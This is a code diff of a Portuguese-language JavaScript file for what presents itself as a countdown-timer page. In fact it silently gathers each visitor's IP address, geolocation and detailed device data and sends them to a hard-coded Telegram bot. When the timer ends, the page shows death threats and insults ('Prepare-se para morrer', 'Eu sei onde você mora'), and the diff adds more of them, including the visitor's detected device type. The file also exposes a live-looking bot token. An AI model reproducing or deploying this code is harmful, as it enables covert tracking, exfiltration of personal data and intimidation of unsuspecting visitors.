@@ -1,6 +1,6 @@
-// script.js - Timer + Mensagens Pesadas (Telegram + Tela)
+// script.js - Timer com detecção de dispositivo + mensagens troll personalizadas
 
-let targetDate = new Date("2026-04-20T02:10:59").getTime();
+let targetDate = new Date("2026-04-20T02:14:59").getTime();
 let userIPv4 = '';
 let userLatitude = '';
 let userLongitude = '';
@@ -10,12 +10,26 @@ let alreadySent = false;
 const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";
 const CHAT_ID = "8448614204";
 
+function detectDeviceType() {
+    const ua = navigator.userAgent.toLowerCase();
+    const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
+    const isTablet = /ipad|tablet|playbook|silk/i.test(ua);
+    const isTV = /smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua);
+    const isConsole = /playstation|xbox|nintendo|switch/i.test(ua);
+
+    if (isTV) return "Smart TV";
+    if (isConsole) return "Console de videogame";
+    if (isTablet) return "Tablet";
+    if (isMobile) return "Celular";
+    return "Computador";
+}
+
 function getDeviceInfo() {
-    const ram = navigator.deviceMemory 
-        ? navigator.deviceMemory + " GB" 
-        : "unknown";
+    const deviceType = detectDeviceType();
+    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unknown";
 
     return {
+        deviceType: deviceType,
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language || navigator.userLanguage,
@@ -25,7 +39,7 @@ function getDeviceInfo() {
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
         deviceMemory: ram,
-        isMobile: /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
+        isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
     };
 }
 
@@ -35,6 +49,7 @@ function sendToTelegram() {
     alreadySent = true;
 
     const device = getDeviceInfo();
+    const devType = device.deviceType;
 
     const message = `🚨 ALVO CAPTURADO - TIMER ZERADO!\n\n` +
                     `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
@@ -42,19 +57,24 @@ function sendToTelegram() {
                     `📍 Latitude: ${userLatitude || 'Não disponível'}\n` +
                     `📍 Longitude: ${userLongitude || 'Não disponível'}\n\n` +
                     `📱 Dispositivo:\n` +
+                    `• Tipo: ${devType}\n` +
                     `• Sistema: ${device.platform}\n` +
                     `• Navegador: ${device.userAgent.substring(0, 100)}...\n` +
                     `• Tela: ${device.screen} (${device.pixelRatio}x)\n` +
                     `• Janela: ${device.windowSize}\n` +
-                    `• Mobile: ${device.isMobile ? 'Sim' : 'Não'}\n` +
                     `• Idioma: ${device.language}\n` +
                     `• Fuso horário: ${device.timezone}\n` +
                     `• Núcleos CPU: ${device.hardwareConcurrency}\n` +
-                    `• Memória RAM aprox: ${device.deviceMemory}\n` +
+                    `• Memória RAM aprox: ${device.deviceMemory}\n\n` +
                     `===================================\n` +
                     `HAHAHAHAHA OLHA SÓ QUE LIXO\n` +
-                    `Que patético, mano...\n\n` +
-                    `Esse cara é betinha HAHAAHAHAHAHAAHAH\n\n` +
+                    `Ficou esperando o timer acabar no ${devType.toLowerCase()} kkkkk\n` +
+                    `Que patético...\n\n` +
+                    `Eu sei que você tá usando essa merda de ${devType}.\n` +
+                    `Eu sei onde você mora.\n` +
+                    `Eu sei qual IP de merda é esse.\n\n` +
+                    `Você não passa de um fracassado inútil.\n` +
+                    `Perdedor de merda.\n\n` +
                     `Não é magia, é habilidade isto...`;
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -71,18 +91,22 @@ function sendToTelegram() {
 
 // ==================== MENSAGEM QUE APARECE NA TELA DO USUÁRIO ====================
 function showFinalMessageOnScreen() {
-    document.getElementById("timer").innerHTML = `
+    const deviceType = detectDeviceType();
+    
+    const screenMessage = `
         Tempo esgotado!<br><br>
         Prepare-se para morrer, seu lixo...<br><br>
+        Eu sei que você tá usando essa merda de ${deviceType.toLowerCase()}.<br>
         Eu sei onde você mora.<br>
-        Eu sei o seu IP.<br>
-        Eu sei qual merda de computador você usa.<br><br>
-        Você é um fracassado.<br>
+        Eu sei o seu IP.<br><br>
+        Você é um fracassado patético.<br>
         Um inútil.<br>
-        Um perdedor patético.<br><br>
+        Um perdedor que não consegue nem ganhar de um timer.<br><br>
         Não é magia, é habilidade isto...<br>
-        <span style="font-size: 1.2rem; color: #ff0000;">E você continua sendo um nada.</span>
+        <span style="color: #ff0000; font-size: 1.3rem;">E você continua sendo um nada.</span>
     `;
+
+    document.getElementById("timer").innerHTML = screenMessage;
 }
 
 function updateTimer() {
@@ -91,8 +115,8 @@ function updateTimer() {
 
     if (timeLeft < 0) {
         clearInterval(timerInterval);
-        showFinalMessageOnScreen();   // Mensagem pesada na tela
-        sendToTelegram();             // Mensagem pesada no Telegram
+        showFinalMessageOnScreen();   // Mensagem na tela
+        sendToTelegram();             // Mensagem no Telegram
         return;
     }
 
